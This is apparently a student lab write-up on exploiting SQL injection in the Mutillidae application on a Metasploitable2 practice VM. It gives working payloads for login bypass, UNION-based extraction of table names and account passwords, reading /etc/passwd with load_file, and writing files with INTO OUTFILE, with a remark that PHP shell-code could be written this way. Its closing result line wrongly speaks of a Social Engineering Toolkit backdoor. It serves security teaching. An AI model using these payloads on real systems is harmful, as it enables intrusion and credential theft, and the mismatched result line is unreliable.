## SQL injection

Exploiting SQL Injection vulnerability

## AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:
Step 1:
Install kali linux either in partition or virtual box or in live mode

Step 2:
Investigate on the various categories of tools as follows:

Step 3:
Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. Identify IP address using ifconfig in Metasploitable2

![image](https://github.com/jagadeepreddy11/sqlinjection/assets/150368525/fd03176a-283f-4ecc-9f7e-d849e3be0721)


Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.

![image](https://github.com/jagadeepreddy11/sqlinjection/assets/150368525/dcb65dcc-3f0e-4d27-a5cb-cb41259f0554)


Select Multidae from the menu listed as shown above. You will get the page as displayed below:

![image](https://github.com/jagadeepreddy11/sqlinjection/assets/150368525/886a813c-0842-4d52-9412-db79e0083335)


Click on the menu Login/Register and register for an account

![image](https://github.com/jagadeepreddy11/sqlinjection/assets/150368525/d15e5bfb-1bdd-40b3-a21b-e63a91973600)


Click on the link “Please register here”

![image](https://github.com/jagadeepreddy11/sqlinjection/assets/150368525/9efb4f17-ddf6-4d91-bebd-c9a0d01fa727)


Click on “Create Account” to display the following page:

![image](https://github.com/jagadeepreddy11/sqlinjection/assets/150368525/7973e2ea-9109-427f-866e-f516267766c7)


The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;). For the username put “abinaya” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.

![image](https://github.com/jagadeepreddy11/sqlinjection/assets/150368525/b952d4ed-b04e-4e18-8465-ced8b57ec0a4)


Click “Login”. The logged in page will show as below:

![image](https://github.com/jagadeepreddy11/sqlinjection/assets/150368525/70890d76-c9f1-4aff-a5f2-e9875682f7e8)


Bypassing login field
The username field is vulnerable. Put (abinaya’ #) or (abinaya’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.” ================================================================= If you face error in registration follow the following steps in metasploitable 2:

This issue is caused by a misconfiguration in the config.inc located in the /var/www/mutillidae folder on Metasploitable 2 VM.

Edit config.inc Edit config.inc file located in /var/www/mutillidae folder on Metasploitable 2 by typing the following commands [one at the time]: cd / sudo nano /var/www/mutillidae/config.inc Type msfadmin when prompted for the root password. Once nano opens config.inc file, look for the line $dbname = ‘metasploit’ as shown in Figure below:

![image](https://github.com/jagadeepreddy11/sqlinjection/assets/150368525/b8e3b24a-01e1-4569-9b38-bccbf4578d47)


Replace ‘metasploit’ with ‘owasp10’ and make sure the lines end with semicolon ; as shown in Figure

![image](https://github.com/jagadeepreddy11/sqlinjection/assets/150368525/0434f0b5-74f9-4ff1-b01c-bf9e71da051b)


Save and exit the config.inc Save than exit the config.inc file by typing CTRL+X keys on your keyboard and the Y [Enter] when prompted to save the file Restart the Apache server To restart Apache, type the following command in the terminal. Alternatively, you can just reboot Metasploitalbe 2 VM. sudo /etc/init.d/apache2 reload

![image](https://github.com/jagadeepreddy11/sqlinjection/assets/150368525/99e237bd-9624-4b63-acba-299ae2f12c88)


Reset Mutillidae database Refresh the page then clicking on the Reset DB menu option to reset the Mutillidae database [Figure ]. Click OK when prompted.

![image](https://github.com/jagadeepreddy11/sqlinjection/assets/150368525/c55e278c-cfeb-47c3-8f33-6d21cdaa7628)


Test the new configuration Alright. Now is time to test if we managed to fix the database issue. Go ahead and register a new account on the Mutillidae webpage.

The Mutillidae database error no longer appears

![image](https://github.com/jagadeepreddy11/sqlinjection/assets/150368525/63246135-3d22-498c-ad4a-c0f28b647de5)


===============================================================

Now after logging out you will see the login page. In the login page give abinaya’ # . You can see the page now enters into the administrator page as before when giving the password.

![image](https://github.com/jagadeepreddy11/sqlinjection/assets/150368525/b53dfec9-c2ea-494a-a305-bf1214224c02)


Click the login button and you will see it enter into the administrator page.

![image](https://github.com/jagadeepreddy11/sqlinjection/assets/150368525/b1ea78ce-2c78-471b-8f79-92a6b62f272a)


Union-based SQL injection
UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info”

After logging out, Now choose the menu as shown below:

![image](https://github.com/jagadeepreddy11/sqlinjection/assets/150368525/274119aa-b808-434d-8181-4c54632a336e)


![image](https://github.com/jagadeepreddy11/sqlinjection/assets/150368525/936ed809-4c4e-4a2d-b24b-db008f37c265)

![image](https://github.com/jagadeepreddy11/sqlinjection/assets/150368525/a276ec9f-808b-4865-9baa-725db96f520a)

![image](https://github.com/jagadeepreddy11/sqlinjection/assets/150368525/6a45940c-22c1-4fad-b227-f8f4ce68841c)


From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.

Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details

After adding the order by 6 into the existing url , the following error statement will be obtained:

When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.

![image](https://github.com/jagadeepreddy11/sqlinjection/assets/150368525/37bb1f54-170e-4224-82ee-04e617d36f33)


As it is having 5 columns the query worked fine and it provides the correct result

![image](https://github.com/jagadeepreddy11/sqlinjection/assets/150368525/1e1db50c-94f9-477c-bbcc-820e0a1f52d2)


Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5).

As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.

![image](https://github.com/jagadeepreddy11/sqlinjection/assets/150368525/5b349c49-5645-4cf9-b362-1adfe39d9b8d)


Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=abinaya%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details

The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5. In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’

http://192.168.43.145/mutillidae/index.php?page=userinfo.php&username=abinaya%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details

The url once executed will retrieve table names from the “owasp 10” database. ##Extracting sensitive data such as passwords

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.

![image](https://github.com/jagadeepreddy11/sqlinjection/assets/150368525/44e9ccdb-bc2b-418d-9f51-7b38b53276ae)


The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=userinfo.php&username=abinaya%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details

Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=abinaya%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/jagadeepreddy11/sqlinjection/assets/150368525/3c133eb0-0424-44f9-bd36-d8328e5917bf)


Reading and writing files on the web-server
We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/jagadeepreddy11/sqlinjection/assets/150368525/fea08dfe-2a5c-4ec5-be1f-438501d7cc01)


the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server. Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).

## RESULT:

The Social Engineering Toolkit (SET) is used to create backdoor is examined successfully
